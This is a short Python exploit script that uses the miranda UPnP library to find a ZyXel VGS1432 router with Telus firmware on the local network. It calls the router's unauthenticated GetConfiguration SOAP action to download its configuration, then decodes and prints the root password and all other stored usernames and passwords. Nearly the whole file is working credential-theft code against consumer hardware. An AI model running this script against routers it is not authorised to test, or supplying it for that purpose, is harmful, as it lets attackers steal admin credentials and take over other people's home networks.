#!/usr/bin/env python

#Dumps the users and passwords on a ZyXel router, specifically the VGS1432 with
#Telus firmware. Will probably work on others.
#
#Not tested on win32, YMMV. Send me a patch if needed.
#
# See http://nada-labs.net/ for more info.
#

import sys

sys.path.append('./miranda-upnp/src/')
from miranda import upnp,msearch
from base64 import b64decode
import xml.etree.ElementTree as ET

#Dump the usernames and passwords from the router config
def dump_passwords(cfg):
    o = []
    r = ET.fromstring(cfg)

    #get the admin (root) password
    root_pass = r.find('./InternetGatewayDevice/X_5067F0_LoginCfg/AdminPassword').text
    root_pass = b64decode(root_pass)
    if root_pass[-1] == '\x00':
        root_pass = root_pass[:-1]

    o.append({'username':'root', 'password':root_pass})

    #get the other configured passwords.
    #we only want elements with the instance attribute.
    for i in r.findall('./InternetGatewayDevice/X_5067F0_LoginCfg/X_5067F0_Login_Group/Use_Login_Info[@instance]'):
        u = i.find('UserName').text
        p = b64decode(i.find('Password').text)

        if p[-1] == '\x00':
            p = p[:-1]

        o.append({'username':u, 'password':p})

    return o

#local UPnP class to shut up some error messages
class localUPnP(upnp):
	def updateCmdCompleter(self,struct):
		pass

def get_router_config():
    hp = localUPnP(False, False, None, {})
    hp.UNIQ = True
    hp.VERBOSE = False
    hp.TIMEOUT = 1

    #find all devices on the network
    msearch(0, None, hp)

    #get the info from the router and check if its one we are looking for
    #most of this section ripped from the host get command in miranda
    for k,h in hp.ENUM_HOSTS.items():
        print("Requesting device and service info for %s (this could take a few seconds)..." % (h['name']))

        (xmlHeaders,xmlData) = hp.getXML(h['xmlFile'])
        if xmlData == False:
            print('Failed to request host XML file:',h['xmlFile'])
            return
        if hp.getHostInfo(xmlData,xmlHeaders,k) == False:
            print("Failed to get device/service info for %s..." % h['name'])
            return
        print('Host data enumeration complete! Checking for GetConfiguration action...')

        #check for the GetConfiguration method
        try:
            if 'GetConfiguration' in h['deviceList']['InternetGatewayDevice']['services']['DeviceConfig']['actions'].keys():
                #You ripper. Get the config.
                #most of this ripped from miranda send command
                print('...Got it! Grabbing the config.')
                c1 = h['proto'] + h['name']
                c2 = h['deviceList']['InternetGatewayDevice']['services']['DeviceConfig']['controlURL']
                if not c1.endswith('/') and not c2.startswith('/'):
                    c1 += '/'
                controlURL = c1 + c2
                fullServiceName = h['deviceList']['InternetGatewayDevice']['services']['DeviceConfig']['fullName']

                #send the request
                sr = hp.sendSOAP(h['name'],fullServiceName,controlURL,'GetConfiguration',{})
                if sr != False:
                    tv = hp.extractSingleTag(sr,'NewConfigFile')
                    return tv

        except KeyError:
            pass

if __name__ == '__main__':
    cfg= get_router_config()
    if cfg:
        p = dump_passwords(cfg)
        for i in p:
            print('%s:%s' % (i['username'], i['password']))
    else:
        print('Configuration file not found')
